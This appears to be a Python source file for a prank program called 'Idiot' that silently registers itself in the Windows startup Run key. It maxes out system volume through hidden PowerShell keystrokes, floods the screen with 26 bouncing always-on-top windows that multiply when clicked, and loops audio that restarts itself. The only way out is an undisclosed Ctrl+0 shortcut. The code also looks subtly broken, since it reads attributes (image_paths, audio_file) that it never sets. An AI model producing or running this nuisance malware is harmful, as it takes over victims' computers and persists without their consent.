def exe_dir():
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))

# Add to startup
APP_NAME = "Idiot"

def add_to_startup_once():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_READ
        )
        winreg.QueryValueEx(key, APP_NAME)
        winreg.CloseKey(key)
        return
    except FileNotFoundError:
        pass

    exe_path = os.path.abspath(sys.argv[0])
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0,
        winreg.KEY_SET_VALUE
    )
    winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, exe_path)
    winreg.CloseKey(key)


# Global audio manager to handle all audio processes
class AudioManager:
    def __init__(self):
        self.audio_processes = []
        self.system = platform.system()
        self.is_stopping = False
    
    def start_audio(self, audio_file):
        """Start audio playback and return the process"""
        if not os.path.exists(audio_file):
            return None
            
        try:
            if self.system == "Windows":
                abs_path = os.path.abspath(audio_file)
                ps_script = f'''
                Add-Type -AssemblyName PresentationCore
                $player = New-Object System.Windows.Media.MediaPlayer
                $player.Open("{abs_path}")
                $player.Volume = 1.0
                $player.Play()
                while ($true) {{
                    Start-Sleep -Milliseconds 100
                    if ($player.Position.TotalSeconds -ge $player.NaturalDuration.TimeSpan.TotalSeconds - 0.1) {{
                        $player.Position = [TimeSpan]::Zero
                        $player.Play()
                    }}
                }}
                '''
                
                process = subprocess.Popen(
                    ['powershell', '-WindowStyle', 'Hidden', '-Command', ps_script],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                self.audio_processes.append(process)
                return process
                
            elif self.system == "Darwin":  # macOS
                subprocess.Popen(['osascript', '-e', 'set volume output volume 100'], 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                process = subprocess.Popen(
                    ['afplay', '-v', '10', '--loop', '0', audio_file],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                self.audio_processes.append(process)
                return process
                
            elif self.system == "Linux":
                for player_cmd in [
                    ['mpg123', '--loop', '-1', '--quiet', audio_file],
                    ['ffplay', '-nodisp', '-autoexit', '-loop', '0', '-volume', '100', audio_file],
                    ['cvlc', '--loop', '--volume', '256', '--play-and-exit', audio_file]
                ]:
                    try:
                        process = subprocess.Popen(
                            player_cmd,
                            stdout=subprocess.DEVNULL,
                            stderr=subprocess.DEVNULL
                        )
                        self.audio_processes.append(process)
                        return process
                    except (FileNotFoundError, subprocess.SubprocessError):
                        continue
            return None
        except:
            return None
    
    def stop_all(self):
        """Stop all audio processes"""
        self.is_stopping = True
        for process in self.audio_processes:
            try:
                if self.system == "Windows":
                    subprocess.Popen(['taskkill', '/F', '/PID', str(process.pid)], 
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                else:
                    process.terminate()
                    process.kill()
            except:
                pass

# Global audio manager instance
audio_manager = AudioManager()

class FloatingImage:
    def __init__(self, root, image_paths, audio_file, x=None, y=None):
        self.root = root
        self.image_paths = image_paths
        self.audio_file = audio_file
        self.playing = True
        self.current_image_index = 0
        self.audio_process = None
        self.has_started_audio = False
        
        # Get screen dimensions
        self.screen_width = root.winfo_screenwidth()
        self.screen_height = root.winfo_screenheight()
        
        # Create a window for this image
        self.window = tk.Toplevel(root)
        self.window.overrideredirect(True)
        self.window.attributes('-topmost', True)
        self.window.config(bg='white')
        
        # Window size - 300x225 (maintains 4:3 ratio)
        self.width = 300
        self.height = 225
        self.window.geometry(f"{self.width}x{self.height}")
        
        # Random starting position
        self.x = x if x is not None else random.randint(0, max(0, self.screen_width - self.width))
        self.y = y if y is not None else random.randint(0, max(0, self.screen_height - self.height))
        self.window.geometry(f"+{self.x}+{self.y}")
        
        # Movement speed (varied for more chaos)
        self.dx = random.choice([-15, -12, -10, 10, 12, 15])
        self.dy = random.choice([-15, -12, -10, 10, 12, 15])
        
        # Speed control (2.5 = normal/faster, 4.5 = high)
        self.speed = 2.5
        self.speed_target = 4.5
        self.speed_transition = 0.1
        
        # Canvas for the image
        self.canvas = tk.Canvas(self.window, bg='white', highlightthickness=0, width=self.width, height=self.height)
        self.canvas.pack()
        
        # Load images at full resolution (300x225)
        self.photo_images = []
        if self.image_paths:
            for img_path in self.image_paths:
                if os.path.exists(img_path):
                    img = Image.open(img_path)
                    img = img.resize((300, 225), Image.Resampling.LANCZOS)
                    photo = ImageTk.PhotoImage(img)
                    self.photo_images.append(photo)
        
        # Create the image on canvas
        if self.photo_images:
            self.image_item = self.canvas.create_image(
                self.width//2, self.height//2,
                image=self.photo_images[0]
            )
        
        # Bind click to spawn more
        self.canvas.bind('<Button-1>', lambda e: self.spawn_more())
        
        # Bind Ctrl+0 to this specific window
        self.window.bind('<Control-Key-0>', lambda e: self.root.event_generate('<<CloseAll>>'))
        
        # Bind window close event
        self.window.protocol("WM_DELETE_WINDOW", self.on_window_close)
        
        # Start animations
        self.switch_images()
        self.move()
        
        # Start audio IMMEDIATELY when window is created
        if self.audio_file and os.path.exists(self.audio_file) and not self.has_started_audio:
            self.start_audio()
    
    def start_audio(self):
        """Start audio playback for this window"""
        if not self.has_started_audio and not audio_manager.is_stopping:
            self.audio_process = audio_manager.start_audio(self.audio_file)
            self.has_started_audio = True
    
    def switch_images(self):
        """Switch between images every 0.5 seconds"""
        if not self.playing or not self.photo_images or len(self.photo_images) < 2:
            return
        
        self.current_image_index = (self.current_image_index + 1) % len(self.photo_images)
        new_image = self.photo_images[self.current_image_index]
        self.canvas.itemconfig(self.image_item, image=new_image)
        self.window.after(500, self.switch_images)
    
    def move(self):
        """Move the image around the screen"""
        if not self.playing:
            return
        
        # Update speed
        if self.speed < self.speed_target:
            self.speed += self.speed_transition
            if self.speed >= self.speed_target:
                self.speed = self.speed_target
                self.speed_target = 2.5 if self.speed_target == 4.5 else 4.5
        else:
            self.speed -= self.speed_transition
            if self.speed <= self.speed_target:
                self.speed = self.speed_target
                self.speed_target = 2.5 if self.speed_target == 4.5 else 4.5
        
        # Calculate movement
        move_x = self.dx * self.speed
        move_y = self.dy * self.speed
        
        # Update position
        self.x += move_x
        self.y += move_y
        
        # Bounce off screen edges
        if self.x <= 0 or self.x >= self.screen_width - self.width:
            self.dx *= -1
        if self.y <= 0 or self.y >= self.screen_height - self.height:
            self.dy *= -1
        
        # Apply new position
        self.window.geometry(f"+{int(self.x)}+{int(self.y)}")
        
        # Continue moving
        self.window.after(30, self.move)
    
    def spawn_more(self):
        """Spawn 6 more floating images when clicked"""
        for _ in range(6):
            FloatingImage(self.root, self.image_paths, self.audio_file)
    
    def on_window_close(self):
        """Handle window close event"""
        self.playing = False
        try:
            self.window.destroy()
        except:
            pass
    
    def close(self):
        """Stop and close"""
        self.playing = False
        try:
            self.window.destroy()
        except:
            pass

class PrankApp:
    def __init__(self):
        # Photo file(s)
        self.image_data = [
            "",
            ""
        ]

        # Audio file(s)
        self.audio_data = ""

                
        # Set system volume to max if possible
        system = platform.system()
        if system == "Windows":
            try:
                subprocess.Popen(['powershell', '-c', 
                                '$wshell = New-Object -ComObject WScript.Shell; ' +
                                'for($i=0; $i -lt 50; $i++) { ' +
                                '$wshell.SendKeys([char]175); Start-Sleep -Milliseconds 10 }'],
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                pass
        
        # Create main window (hidden)
        self.root = tk.Tk()
        self.root.withdraw()
        
        # Global key binding for Ctrl+0 to close all
        self.root.bind_all('<Control-Key-0>', self.close_all)
        
        # Custom event for closing all windows
        self.root.bind('<<CloseAll>>', self.close_all)
        
        # List to track all floating images
        self.images = []
        
        # Create initial 26 floating images - audio starts instantly with windows
        for i in range(26):
            img = FloatingImage(self.root, self.image_paths, self.audio_file)
            self.images.append(img)
            if i % 5 == 0:
                self.root.update()
        
        # Start a monitor thread to ensure audio keeps playing
        self.monitor_audio_thread = threading.Thread(target=self.monitor_audio, daemon=True)
        self.monitor_audio_thread.start()
        
        self.root.mainloop()
    
    def monitor_audio(self):
        """Monitor audio processes and restart if they stop unexpectedly"""
        while True:
            time.sleep(5)
            active_count = 0
            for process in audio_manager.audio_processes:
                try:
                    if process.poll() is None:
                        active_count += 1
                except:
                    pass
            
            if active_count == 0 and not audio_manager.is_stopping:
                if os.path.exists(self.audio_file):
                    audio_manager.start_audio(self.audio_file)
    
    def close_all(self, event=None):
        """Close all when Ctrl+0 is pressed"""
        for img in self.images:
            img.close()
        audio_manager.stop_all()
        self.root.quit()
        sys.exit(0)

if __name__ == "__main__":
    add_to_startup_once()
    app = PrankApp()
